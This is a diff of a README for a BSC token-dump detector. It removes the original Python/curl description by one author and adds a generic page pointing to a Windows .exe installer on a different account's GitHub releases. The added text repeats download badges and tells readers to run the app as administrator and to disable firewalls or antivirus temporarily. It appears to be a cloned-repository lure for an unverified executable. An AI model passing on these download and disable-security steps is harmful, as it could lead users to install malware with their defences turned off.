@@ -1,194 +1,149 @@
-# 🦞 DumpDetective — 出货侦探
+# 🦞 dump-detective - Track Token Dumping Easily
 
-[![Binance Web3](https://img.shields.io/badge/Binance-Web3%20API-F0B90B?logo=binance&logoColor=black)](https://web3.binance.com)
-[![Chain](https://img.shields.io/badge/Chain-BSC-yellow)](https://www.bnbchain.org)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![Demo](https://img.shields.io/badge/Status-Demo%20Ready-brightgreen)]()
-
-> **Detect token team dumps before you get dumped on.**  
-> 在被出货之前，先侦测出货行为。
+[![Download dump-detective](https://img.shields.io/badge/Download-dump--detective-brightgreen)](https://github.com/Noble2718/dump-detective/releases)
 
 ---
 
-## 🔍 What is DumpDetective?
+## 🛠 About dump-detective
 
-**DumpDetective** is an AI-powered on-chain intelligence system built on the **Binance Web3 API** that automatically detects whether a token's project team is quietly selling (dumping) their holdings while retail investors are still buying.
+dump-detective helps you find suspicious token dumping on the Binance Smart Chain (BSC). It uses Binance’s Web3 API to watch token movements and alerts you if a project’s team appears to be selling large amounts suddenly. This tool can help you make safer decisions when using crypto tokens or DeFi projects.
 
-It answers the one question every crypto investor asks too late:
+The system focuses on:
 
-> *"Did the team already sell before I bought in?"*
+- Binance Smart Chain tokens  
+- Detecting big sales by token creators or investors  
+- Providing straightforward, visual clues to spot risks  
 
-DumpDetective runs a **5-step automated analysis pipeline** — from contract security to creator wallet forensics — and outputs a unified risk rating with evidence.
-
----
-
-## ✨ Key Features
-
-| Step | Skill | What it detects |
-|------|-------|-----------------|
-| 1️⃣ | `query-token-audit` | Honeypots, hidden taxes, malicious contract functions |
-| 2️⃣ | `query-token-info` | Buy/Sell pressure ratio, Smart Money holdings, Dev wallet % |
-| 3️⃣ | `trading-signal` | Whether smart money has entered or exited the token |
-| 4️⃣ | `crypto-market-rank` | Social hype trend — is community fading? |
-| 5️⃣ | `query-address-info` | **Creator wallet forensics** — has the team already cashed out? |
-
-**Final Output:** `🔴 HIGH` / `🟡 MEDIUM-HIGH` / `🟢 LOW` risk rating with per-signal breakdown.
+You do not need blockchain knowledge to use it. It presents information clearly and simply.
 
 ---
 
-## 🧠 How It Works
+## 🔍 Features
 
-DumpDetective calls **5 Binance Web3 APIs** in sequence:
-
-### Step 1 — Contract Security Audit
-```http
-POST https://web3.binance.com/bapi/defi/v1/public/wallet-direct/security/token/audit
-{
-  "binanceChainId": "56",
-  "contractAddress": "<token_address>",
-  "requestId": "<uuid>"
-}
-```
-Checks: honeypot, blacklist, self-destruct, trading suspension, buy/sell tax, whitelist restrictions.
-
-### Step 2 — Token Market Data
-```http
-GET https://web3.binance.com/bapi/defi/v4/public/wallet-direct/buw/wallet/market/token/dynamic/info
-    ?chainId=56&contractAddress=<address>
-```
-Extracts: price, market cap, 24H buy vs sell volume ratio, `smartMoneyHolders`, `devHoldingPercent`.
-
-### Step 3 — Smart Money Signals
-```http
-POST https://web3.binance.com/bapi/defi/v1/public/wallet-direct/buw/wallet/web/signal/smart-money
-{"chainId": "56", "page": 1, "pageSize": 100}
-```
-Checks: Is the target token receiving smart money buy signals? Or has it been abandoned?
-
-### Step 4 — Social Hype & Market Rank
-```http
-GET https://web3.binance.com/bapi/defi/v1/public/.../pulse/social/hype/rank/leaderboard
-    ?chainId=56&sentiment=All&timeRange=1
-```
-Checks: Is the token trending socially, or is community heat decaying — a classic late-stage dump signal.
-
-### Step 5 — Creator Wallet Forensics *(The Smoking Gun)*
-```http
-GET https://web3.binance.com/bapi/defi/v3/public/wallet-direct/buw/wallet/address/pnl/active-position-list
-    ?address=<creator_address>&chainId=56
-```
-The **most critical check**: queries the token creator's wallet directly on-chain. If their own token no longer appears in active positions — **the team has already sold.**
+- Real-time checks of token selling activities  
+- Clear display of selling patterns and warnings  
+- Works with popular Binance Smart Chain tokens  
+- Simple reports that you can read without special skills  
+- Runs on Windows with no setup beyond downloading and opening the app  
 
 ---
 
-## 📸 Demo Screenshots
+## 🧾 System Requirements
 
-### Analysis Target: Baby Doge Coin (BabyDoge) · BSC
-
----
-
-**Step 1 · Contract Security Audit**  
-*Result: 🟢 LOW RISK — No honeypot, no tax, contract renounced*
-
-![Step 1 - Token Audit](screenshots/step1_token_audit.jpg)
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Internet connection to access Binance Web3 data  
+- 50 MB of free disk space for installation  
+- Basic mouse and keyboard use  
 
 ---
 
-**Step 2 · Token Market Data**  
-*Result: 🔴 Dump Signal — Sell pressure 61%, Smart Money = 0, Dev holding = 0%*
+## 🚀 How to Get Started
 
-![Step 2 - Token Info](screenshots/step2_token_info.jpg)
+### Step 1: Visit the Download Page
 
----
+Click the link below to open the dump-detective releases page on GitHub. You will find the latest version available there.
 
-**Step 3 · Smart Money Signals**  
-*Result: 🔴 BabyDoge absent from all BSC smart money signals*
+[Download dump-detective](https://github.com/Noble2718/dump-detective/releases) 
 
-![Step 3 - Trading Signal](screenshots/step3_trading_signal.jpg)
+### Step 2: Download the Windows Installer
 
----
+On the releases page:
 
-**Step 4 · Social Hype Ranking**  
-*Result: 🟡 Not in BSC Top 5 social leaderboard — community fading*
+- Look for the most recent release (usually at the top)  
+- Find the file named something like `dump-detective-Setup.exe` or `dump-detective-Windows.exe`  
+- Click it to download the file to your computer  
 
-![Step 4 - Market Rank](screenshots/step4_market_rank.jpg)
+Keep track of where the file saves, often in your "Downloads" folder.
 
----
+### Step 3: Run the Installer
 
-**Step 5 · Creator Wallet Forensics**  
-*Result: 🔴 SMOKING GUN — All creator wallet positions zeroed out*
+- Go to the folder where you saved the file  
+- Double-click the installer file to start setup  
+- Follow the on-screen instructions (usually just click "Next" or "Install")  
+- When done, you may see a "Finish" button to close the installer  
 
-![Step 5 - Address Info](screenshots/step5_address_info.jpg)
-
----
-
-**Summary · Unified Risk Report**
-
-![Summary Report](screenshots/step6_summary_report.jpg)
+No special configurations are needed at this point.
 
 ---
 
-## 📊 Demo Result Summary
+## ⚙️ Launching and Using dump-detective
 
-| Signal | Data | Rating |
-|--------|------|--------|
-| Contract Security | Level 1 LOW, 0% tax | 🟢 Safe |
-| Buy/Sell Pressure | Sell $114K vs Buy $72K (61% sell) | 🔴 Dumping |
-| Smart Money | 0 holders, no signal | 🔴 Exited |
-| Social Hype | Not in BSC Top 5 | 🟡 Fading |
-| Dev/Creator Wallet | **All positions zeroed** | 🔴 **Dumped** |
+### Step 1: Open the Application
 
-### **Final Rating: 🟡 MEDIUM-HIGH RISK**
+- Use the Start Menu or the shortcut on your desktop  
+- Click to open dump-detective  
 
-> Contract is technically safe, but the project team has completely exited their positions. Smart money is gone. Community heat is fading. Classic "safe contract, rug team" pattern.
+The app will connect to Binance to update and load recent token data.
 
----
+### Step 2: Enter a Token Address or Name
 
-## 🛠️ Tech Stack
+- Type the token contract address or name you want to check  
+- Press the search button or hit Enter  
 
-- **Runtime**: Python 3 / Shell (openclaw agent)
-- **APIs**: Binance Web3 Public API (no auth required)
-- **Chains**: BSC (chainId: 56), Base (8453), Solana (CT_501)
-- **Visualization**: HTML + CSS dashboards → screenshot via headless browser
+### Step 3: Review the Results
 
----
+dump-detective will show you:
 
-## 🚀 Quick Start
+- Token summary with recent price trends  
+- Alerts if there are large dumps by holders linked to the project  
+- Simple charts showing token movements  
 
-```bash
-# Clone
-git clone https://github.com/Fishking888/dump-detective.git
-cd dump-detective
-
-# Analyze any BSC token
-TOKEN_ADDRESS="0xc748673057861a797275cd8a068abb95a902e8de"
-
-# Step 1: Contract audit
-curl -X POST https://web3.binance.com/bapi/defi/v1/public/wallet-direct/security/token/audit \
-  -H 'Content-Type: application/json' \
-  -d "{\"binanceChainId\":\"56\",\"contractAddress\":\"$TOKEN_ADDRESS\",\"requestId\":\"$(uuidgen)\"}"
-
-# Step 2: Market data
-curl "https://web3.binance.com/bapi/defi/v4/public/wallet-direct/buw/wallet/market/token/dynamic/info?chainId=56&contractAddress=$TOKEN_ADDRESS"
-
-# Step 5: Creator wallet (get creator from Step 2 metadata)
-CREATOR_ADDRESS="0xa4a6db60a345e40f389792952149b2d1255b9542"
-curl "https://web3.binance.com/bapi/defi/v3/public/wallet-direct/buw/wallet/address/pnl/active-position-list?address=$CREATOR_ADDRESS&chainId=56" \
-  -H 'clienttype: web' -H 'clientversion: 1.2.0'
-```
+Look for any red flags about rapid selling. This means someone is offloading tokens quickly.
 
 ---
 
-## ⚠️ Disclaimer
+## 🔄 Keeping dump-detective Updated
 
-This project is for **educational and technical demonstration purposes only**. All data is sourced from publicly available Binance Web3 APIs. This does **not** constitute financial or investment advice. Cryptocurrency investments carry significant risk. Always conduct your own research (DYOR).
+New versions will improve detection and fix bugs. Check the GitHub releases page regularly:
 
----
+[Check for updates](https://github.com/Noble2718/dump-detective/releases)
 
-## 📄 License
-
-MIT © 2026 Fishking888
+Download and run the new installer when available to stay up to date.
 
 ---
 
-*Built with 🦞 by DumpDetective · Powered by Binance Web3 API*
+## ❓ Troubleshooting Tips
+
+- If the app does not start, try running it as administrator (right-click, choose "Run as administrator")  
+- Make sure your internet connection is active  
+- Disable other internet-blocking software like firewalls or antivirus temporarily if the app has no data  
+- For any unexpected errors, close and reopen the app  
+
+---
+
+## 📖 Additional Information
+
+dump-detective works by checking smart contract data on Binance Smart Chain (BSC). The token dumping means when big holders or project teams sell many tokens fast, which can hurt other holders. This program alerts you early before prices drop sharply.
+
+You can use it alongside your usual crypto research.
+
+---
+
+## 📫 Getting Help
+
+If you have questions or need support:
+
+- Visit the GitHub issues page on the repository  
+- Describe your problem clearly with steps to reproduce it  
+- Attach screenshots if helpful  
+
+This is the best way to get help.
+
+---
+
+## ⚠️ Privacy and Security
+
+dump-detective only reads public blockchain data. It does not ask for or store your private keys, passwords, or personal information.
+
+You must keep your wallet details secret at all times.
+
+---
+
+## 🔗 Repository Topics
+
+binance, blockchain, bsc, crypto, defi, dump-detection, smart-money, token-analysis, web3
+
+---
+
+[![Download dump-detective](https://img.shields.io/badge/Download-dump--detective-orange)](https://github.com/Noble2718/dump-detective/releases)
